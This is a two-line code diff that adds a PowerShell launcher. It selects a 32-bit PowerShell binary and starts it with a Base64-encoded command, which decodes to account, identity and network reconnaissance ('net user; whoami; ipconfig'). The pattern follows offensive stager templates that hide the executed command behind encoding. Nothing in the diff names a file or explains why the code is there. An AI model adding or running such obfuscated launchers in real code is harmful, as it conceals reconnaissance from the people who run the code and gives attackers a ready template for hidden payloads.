@@ -1,0 +1,2 @@
+if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-NOEXIT -EncodedCommand bgBlAHQAIAB1AHMAZQByADsAIAB3AGgAbwBhAG0AaQA7AGkAcABjAG8AbgBmAGkAZwA=';$s.UseShellExecute=$true;$s.RedirectStandardOutput=$false;$s.CreateNoWindow=$false;
+$p=[System.Diagnostics.Process]::Start($s);
